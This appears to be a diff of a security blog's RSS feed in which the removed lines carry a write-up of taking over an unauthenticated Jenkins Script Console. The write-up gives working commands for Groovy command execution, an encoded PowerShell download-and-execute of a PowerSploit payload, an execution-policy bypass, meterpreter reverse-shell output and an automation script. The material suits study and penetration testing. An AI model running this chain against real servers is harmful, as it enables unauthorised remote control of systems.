@@ -2,11 +2,14 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Command Execution on #!/slash/note</title>
-    <link>https://leonjza.github.io/categories/command-execution/index.xml</link>
+    <link>https://leonjza.github.io/categories/command-execution/</link>
     <description>Recent content in Command Execution on #!/slash/note</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <atom:link href="https://leonjza.github.io/categories/command-execution/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 27 May 2015 20:40:40 +0000</lastBuildDate>
+    
+	<atom:link href="https://leonjza.github.io/categories/command-execution/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>jenkins to meterpreter toying with powersploit</title>
@@ -23,148 +26,7 @@
 
 
 &lt;p&gt;Recently I came across a few &lt;a href=&#34;https://jenkins-ci.org/&#34;&gt;Jenkins&lt;/a&gt; continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lt;em&gt;&amp;lsquo;secure&amp;rsquo;&lt;/em&gt;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
-&lt;/p&gt;
-
-&lt;h2 id=&#34;groooooooovy&#34;&gt;groooooooovy&lt;/h2&gt;
-
-&lt;p&gt;At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the &lt;em&gt;Script Console&lt;/em&gt; that Jenkins provides:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_script_console.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;This looked promising. &lt;em&gt;&amp;lsquo;Type in an arbitrary Groovy script and execute it on the server.&amp;rsquo;&lt;/em&gt; I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the &lt;a href=&#34;http://www.groovy-lang.org/groovy-dev-kit.html#process-management&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;def process = &amp;quot;ls -l&amp;quot;.execute()
-println &amp;quot;Found text ${process.text}&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_console_command_exec.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Nice and easy command execution! :D&lt;/p&gt;
-
-&lt;h2 id=&#34;interactive-shell-power-shell&#34;&gt;interactive shell, power shell&lt;/h2&gt;
-
-&lt;p&gt;Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;reverse shell&lt;/a&gt; and moving on from there. On Windows based environments though, the builtin &lt;code&gt;cmd.exe&lt;/code&gt; definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.&lt;/p&gt;
-
-&lt;p&gt;The one Jenkins machine that I had found was running on Windows as &lt;code&gt;nt authority\system&lt;/code&gt;, which of course was &lt;em&gt;great&lt;/em&gt; news! I figured though that in order to get a meterpreter shell, I&amp;rsquo;d have to approach this in some conventional way. Either obtaining credentials somehow and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. Some investigations showed though that the AV on the box was killing the meterpreter.exe on the box so that option was out as well. So, next on the list? I could just make use of &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt; to download and execute one using one command.&lt;/p&gt;
-
-&lt;p&gt;Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.&lt;/p&gt;
-
-&lt;p&gt;In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A &lt;code&gt;payload&lt;/code&gt; which includes the &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&amp;rsquo;t worry it should be more clear after we have gone through it.&lt;/p&gt;
-
-&lt;h2 id=&#34;preparing-the-payload&#34;&gt;preparing the payload&lt;/h2&gt;
-
-&lt;p&gt;As already mentioned, I was going to use &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about &lt;em&gt;payload&lt;/em&gt; here, all it really is is a file that will be made available via HTTP for the powershell script to download.&lt;/p&gt;
-
-&lt;p&gt;The payload will consist of 2 parts. First, defining &lt;code&gt;function Invoke-Shellcode {}&lt;/code&gt;, and then invoking the function for a &lt;code&gt;windows/meterpreter/reverse_https&lt;/code&gt; shell. Kali Linux has powersploit available in &lt;code&gt;/usr/share&lt;/code&gt; so all I really did was cat it to my &lt;code&gt;payload&lt;/code&gt; file:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &amp;gt; payload
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;After that, I added the following line to the &lt;code&gt;payload&lt;/code&gt; file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport 443 -Force
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This file was finally served via HTTP using the python SimpleHTTPServer with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; which meant that it would be available at &lt;a href=&#34;http://192.168.252.1:8000/payload&#34;&gt;http://192.168.252.1:8000/payload&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2 id=&#34;preparing-the-command&#34;&gt;preparing the command&lt;/h2&gt;
-
-&lt;p&gt;Next, we need to prepare the actual command to run. We will make use of the powershell &lt;a href=&#34;https://technet.microsoft.com/en-us/library/hh849893.aspx&#34;&gt;Invoke-Expression&lt;/a&gt; command and give it a [Net.WebClient.DownloadString](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&lt;/a&gt;) object to download the payload we previously prepared and execute it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.252.1:8000/payload&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;That whole command needs to be &lt;a href=&#34;http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx&#34;&gt;encoded&lt;/a&gt; so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The above will output a base64 encoded string that should be passed to the Powershell &lt;code&gt;-Enc&lt;/code&gt; flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing &lt;code&gt;-Exec ByPass&lt;/code&gt; to the powershell executable. So, in summary, the command will be as follows:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;pwn&#34;&gt;pwn&lt;/h2&gt;
-
-&lt;p&gt;So, I now had the &lt;code&gt;payload&lt;/code&gt; file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_powershell_payload.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;From the python web server we can see the request come in for the payload:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;192.168.252.100 - - [28/May/2015 12:37:15] &amp;quot;GET /payload HTTP/1.1&amp;quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And pop!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msf exploit(handler) &amp;gt; exploit
-
-[*] Started HTTPS reverse handler on https://0.0.0.0:443/
-[*] Starting the payload handler...
-[*] 192.168.252.100:54023 Request received for /INITM...
-[*] 192.168.252.100:54023 Staging connection for target /INITM received...
-[*] Meterpreter session 1 opened (192.168.252.1:443 -&amp;gt; 192.168.252.100:54023) at 2015-05-28 12:37:17 +0200
-
-meterpreter &amp;gt;
-meterpreter &amp;gt; getuid
-Server username: NT AUTHORITY\SYSTEM
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;automation&#34;&gt;automation&lt;/h2&gt;
-
-&lt;p&gt;While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
-
-# meterpreter ip &amp;amp; port
-lhost=192.168.252.1
-lport=443
-
-echo &amp;quot; * Writing Payload&amp;quot;
-cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &amp;gt; payload
-echo &amp;quot;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force&amp;quot; &amp;gt;&amp;gt; payload
-
-echo &amp;quot; * Prepping Command&amp;quot;
-scriptblock=&amp;quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://$lhost:8000/payload&#39;)&amp;quot;
-echo $scriptblock
-
-echo
-echo &amp;quot; * Encoding command&amp;quot;
-encode=&amp;quot;`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`&amp;quot;
-echo $encode
-
-command=&amp;quot;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode&amp;quot;
-echo
-echo &amp;quot; * Final command&amp;quot;
-echo $command
-
-echo
-echo &amp;quot; * Starting HTTP Server to serve payload&amp;quot;
-python -m SimpleHTTPServer
-&lt;/code&gt;&lt;/pre&gt;</description>
+&lt;/p&gt;</description>
     </item>
     
   </channel>
